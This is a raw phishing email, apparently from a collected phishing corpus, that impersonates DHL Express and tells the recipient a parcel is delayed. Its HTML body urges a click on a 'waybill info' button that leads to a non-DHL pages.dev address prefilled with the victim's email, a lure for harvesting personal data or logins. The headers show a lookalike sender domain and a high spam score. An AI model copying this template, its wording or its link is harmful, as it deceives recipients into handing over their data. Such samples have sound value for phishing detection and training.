@@ -1,0 +1,128 @@
+Return-Path: sales@mail-item.top
+Delivered-To: jose@monkey.org
+X-FDA: 82214664840.05.5F62E4C
+Received: from mail-item.top (mail-item.top [95.213.173.51])
+	by imf02.b.hostedemail.com (Postfix) with ESMTP id 67CEF1A000A
+	for <jose@monkey.org>; Mon, 10 Jun 2024 10:52:19 +0000 (UTC)
+Authentication-Results: imf02.b.hostedemail.com;	dkim=pass
+ header.d=mail-item.top header.s=default header.b=OiRRrxSQ;	dmarc=pass
+ (policy=quarantine) header.from=mail-item.top;	spf=pass
+ (imf02.b.hostedemail.com: domain of sales@mail-item.top designates
+ 95.213.173.51 as permitted sender) smtp.mailfrom=sales@mail-item.top
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1718016739;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=kmsnIh8pkDK2V2M6WRyjoHFwRxBpPkMKIYnOvCouN1o=;
+	b=CRa3O+yOB2bJ8uPrmy4REEPkIzeeWpbQAU77XL6WF8f9ynjfasa17NLp50lby20IlZCXs2
+	oBPUM1nhBrFxD1KVE+gih8oUtSpCUIUnu59ahtXNqQ1PwTh4DfY09btnv/p/PeINw3gHlK
+	e/hX8A2wf3z7QSjypoGTJQ4FExs6PRY=
+ARC-Authentication-Results: i=1;	imf02.b.hostedemail.com;	dkim=pass
+ header.d=mail-item.top header.s=default header.b=OiRRrxSQ;	dmarc=pass
+ (policy=quarantine) header.from=mail-item.top;	spf=pass
+ (imf02.b.hostedemail.com: domain of sales@mail-item.top designates
+ 95.213.173.51 as permitted sender) smtp.mailfrom=sales@mail-item.top
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1718016739; a=rsa-sha256;
+	cv=none;
+	b=HTsHjss/zKUigisX1my9dFNoHDPaXLq+9P6aPMeo4ch8vFPe4ukDp/6ARkJRGFDbyzAaw8
+	/sBJLfA2duzT01G/33IpCS/mtA0d41pDP6A6lDKeTnG/V2WkkjDYLSSIhr5HkbCeLnBUuI
+	bnWcfI4x7UQnkebQ+glkvn4qDlBvRms=
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=default;
+ d=mail-item.top; =?utf-8?q?h=3DFrom=3ATo=3ASubject=3ADate=3AMessage-ID=3AMI?=
+ =?utf-8?q?ME-Version=3AContent-Type=3AContent-Transfer-Encoding=3B?=
+ i=sales@mail-item.top; bh=Gu6yPnpQYE6QGwRfq6Y+ukp9aAc=; =?utf-8?q?b=3DOiRRr?=
+ =?utf-8?q?xSQqCZ2AbTSW5lLASw6wkK0CqxsdJXWMzW1gBNLC0uvuSMTEvmErAVaU/qvBjC39h?=
+ =?utf-8?q?ZdMig9?=  
+ DCPgrj5GEglbctrzu2AUfMfZywUqkCY3hK0J0oDTBiufL+gXvdgSBRhoYBk41SoPjmk2iCQ0d2he
+   rgGjdyNZ+3pFY3FJ++w=
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=default; d=mail-item.top; 
+ =?utf-8?q?b=3DMZhN1qiVL0ZsCCnq2UgXYuH+7VMEIr3cFyneB1wj3Qn7uS86y5JiUJI6anPWY?=
+ =?utf-8?q?vO/bJSiG+iB+Lkt?=  
+ eObRgNOdKtSXfPaF6eeIaV5gGi0kvF1DjUwTttH4BgczGLi7x33CaC4nyR4zBz+IdMPkcSZ5d8Nl
+   y/H/QrmwyAiDS0sf/3M=;
+From: DHL DISPATCH<sales@mail-item.top>
+To: jose@monkey.org
+Subject: Important: Verify Your Address for DHL Parcel Dispatch
+Date: 10 Jun 2024 03:52:16 -0700
+Message-ID: <20240610001149.FFC58B93AC9E0B24@mail-item.top>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam11
+X-Rspamd-Queue-Id: 67CEF1A000A
+X-Stat-Signature: kmh1xj9qierh9jktciibcy89dfwpdfoe
+X-Spam-Status: Yes, score=12.70
+X-Rspam-User: 
+X-HE-Tag: 1718016739-315433
+X-HE-Meta: =?utf-8?q?U2FsdGVkX19BRPWTNnICYs7Slyj4Bl7seLcdv6/oBwj3CSzhj2A+xDb?=
+ =?utf-8?q?vhgGh5eNeIasjZRbxEscCZgSgkCdRwd1N31kio6aeSMGBn41HdK3wt3yeWSYMSjkJ?=
+ =?utf-8?q?QAmPBqAG9RsYjcWgAVZ0eEn6xtvF+4tyfmG9HNmBo+Nnbhs7AdRQt0wWPgtVkxSA7?=
+ =?utf-8?q?QNS3LeHxj/Y6IKHp0kEuL+nqYrhI5BfOlrRZuwfJ+at5uJ5AfQ=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 176
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em; font-size: 14pt;">
+<div class=3D"header" style=3D"padding: 10px; text-align: center; color: rg=
+b(0, 0, 0); text-transform: none; text-indent: 0px; letter-spacing: normal;=
+ font-family: Arial, sans-serif; font-size: medium; font-style: normal; fon=
+t-weight: bold; word-spacing: 0px; white-space: normal; orphans: 2; widows:=
+ 2; background-color: yellow; font-variant-ligatures: normal; font-variant-=
+caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: in=
+itial; text-decoration-style: initial;=20
+text-decoration-color: initial;">=3D=3D=3DDHL EXPRESS=3D=3D=3D</div>
+<div class=3D"content" style=3D"padding: 20px; color: rgb(0, 0, 0); text-tr=
+ansform: none; text-indent: 0px; letter-spacing: normal; font-family: Arial=
+, sans-serif; font-size: medium; font-style: normal; font-weight: 400; word=
+-spacing: 0px; white-space: normal; orphans: 2; widows: 2; font-variant-lig=
+atures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; =
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial;"><p>ATTN:</p><p>
+Dear Customer,</p><p>Your parcel has arrived at our office but there were s=
+ome delays delivering to your address. Herein is the link to your DHL recei=
+pt for your reference.</p><p>Please click the button below to confirm your =
+address is correct before we submit to our outlet officer for dispatch to y=
+our destination.</p><p class=3D"highlight" style=3D"color: red; font-weight=
+: bold;">Class: Package Services<br>Service(s): Delivery Confirmation<br>St=
+atus: Notification sent</p>
+<a class=3D"button" style=3D"margin: 20px 0px; padding: 10px 20px; border-r=
+adius: 5px; text-align: center; color: white; font-size: 16px; text-decorat=
+ion: none; display: inline-block; cursor: pointer; background-color: blue;"=
+ href=3D"https://inmotiondhil.pages.dev/?e=3Djose@monkey.org">Click here fo=
+r waybill info</a><p>NOTE: Please check the details carefully.<br>Dispatch =
+Department DHL Express.</p><p>Email:<span>&nbsp;</span><span class=3D"link"=
+ style=3D"color: blue; text-decoration: underline;">
+no-reply@dhl.com</span></p>
+<div class=3D"header" style=3D"padding: 10px; text-align: center; font-weig=
+ht: bold; background-color: yellow;">=3D=3D=3DDHL EXPRESS=3D=3D=3D</div><p>=
+<span class=3D"link" style=3D"color: blue; text-decoration: underline;">www=
+=2Edhl.com</span></p></div>
+<div class=3D"footer" style=3D"padding: 20px; color: rgb(85, 85, 85); text-=
+transform: none; text-indent: 0px; letter-spacing: normal; font-family: Ari=
+al, sans-serif; font-size: 10px; font-style: normal; font-weight: 400; marg=
+in-top: 20px; word-spacing: 0px; border-top-color: rgb(204, 204, 204); bord=
+er-top-width: 1px; border-top-style: solid; white-space: normal; orphans: 2=
+; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -we=
+bkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial;">
+Under no circumstances shall this information or the information contained =
+in any e-mail constitute a binding agreement to carry or for provision of c=
+arriage services whether with the listed or alternative carriers or vessels=
+=2E The carrier may, in its absolute discretion, at any time and without pr=
+ior notice, change the arrangement listed or make alternate arrangement or =
+decline a booking. We recommend you to check with the carrier for any chang=
+es. The actual provision of carriage services is=20
+subject to the final acceptance of the carrier and subject to the availabil=
+ity of the carrier's equipment and vessel and subject to the terms and cond=
+itions set out in the carrier's standard bill of lading.</div></body></html=
+>
+
